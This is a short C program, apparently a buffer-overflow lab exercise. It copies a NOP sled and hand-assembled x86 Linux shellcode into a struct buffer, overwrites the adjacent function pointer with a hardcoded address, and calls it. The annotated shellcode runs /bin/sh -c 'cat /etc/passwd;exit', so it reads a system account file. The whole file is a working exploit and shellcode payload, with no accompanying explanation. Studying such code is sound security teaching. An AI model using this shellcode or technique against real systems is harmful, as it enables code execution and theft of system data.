
#include <stdio.h>

struct {
    char buffer[100];
    void (*x)();
} y;

void foo();
int main(){

    char *exploit =
	 "XXXXXXXXXXXXXXXXXXXX"
	 "XXXXXXXXXXXXXXXXXXXX"
	 "XXXXXXXXXXXXXXXXXXXX"
	 "XXXXXXXXXXXXXXXXXXXX"
	 "XXXXXXXXXXXXXXXXXXXX"
	 "WXYZ";

    char exploit2[105] = {
    // Padding
    0x90,0x90,0x90,
    // exploit code goes here
                                       			
                                                        //   			; find out where we are
    0xEB,0x29                                           // start: 		jmp short codeEnd
    ,0x5E                                               // start2:		pop esi
                                       			
                                                        //   			; clear the A register
    ,0x31,0xC0                                          // 			    xor eax,eax
                                       			
                                                        //  			; restore null bytes in data
    ,0x88,0x46,0x07                                     // 			    mov [byte esi+flagStr-exeStr-2],al			; move null byte to end of /bin/sh
    ,0x88,0x46,0x0B                                     // 			    mov [byte esi+cmdStr-exeStr-1],al			; move null byte to end of -c
    ,0x88,0x46,0x20                                     // 			    mov [byte esi+arrayAddr-exeStr-1],al		; move null byte to end of shell command
    ,0x89,0x46,0x2D                                     // 			    mov [byte esi+arrayAddr-exeStr+12],eax		; move null word to end of array
                                                        //  			
                                                        //  			; Restoring the array
    ,0x89,0x76,0x21                                     //              mov [byte esi+arrayAddr-exeStr],esi
    ,0x8D,0x7E,0x09                                     //              lea edi,[byte esi+flagStr-exeStr]
    ,0x89,0x7E,0x25                                     //              mov [byte esi+arrayAddr-exeStr+4],edi
    ,0x8D,0x7E,0x0C                                     //              lea edi,[byte esi+cmdStr-exeStr]
    ,0x89,0x7E,0x29                                     //              mov [byte esi+arrayAddr-exeStr+8],edi
                                      			
                                                        //  		    ; setup registers and make system call.
    ,0xB0,0x0B                                          // 			    mov al,0x0b
    ,0x89,0xF3                                          // 			    mov ebx,[byte esi+exeStr]
    ,0x8D,0x4E,0x21                                     // 			    mov ecx,[byte esi+arrayAddr]
    ,0x31,0xD2                                          // 			    xor edx,edx
    ,0xCD,0x80                                          // 			    int 0x80
    ,0xE8,0xD2,0xFF,0xFF,0xFF                           // codeEnd:     call start2
                                      			
                                                        // 		    	; data
    ,0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,0x58,0x79       // exeStr:   	db "/bin/shXy"
    ,0x2D,0x63,0x58                                     // flagStr: 	db "-cX"
    ,0x63,0x61,0x74,0x20,0x2F,0x65,0x74,0x63,0x2F       // cmdStr: 	    db "cat /etc/passwd;exitX"
    ,0x70,0x61,0x73,0x73,0x77,0x64,0x3B,0x65,0x78
    ,0x69,0x74,0x58             
    ,0xFF,0xFF,0xFF,0xFF                                // arrayAddr: 	dd 0xffffffff
    ,0xFF,0xFF,0xFF,0xFF                                // 			    dd 0xffffffff
    ,0xFF,0xFF,0xFF,0xFF                                // 			    dd 0xffffffff
    ,0xFF,0xFF,0xFF,0xFF                                // 			    dd 0xffffffff
   
    // buffer address goes here
    ,0x40,0x97,0x04,0x08,

    // NULL terminator
    0x00

    };

    int i;

    y.x = foo;
    for (i = 0; exploit2[i]; i++){
	y.buffer[i] = exploit2[i];
    }

    (*y.x)();
}


void foo(){
   printf("%s %x\n", y.buffer, &y.x);
}
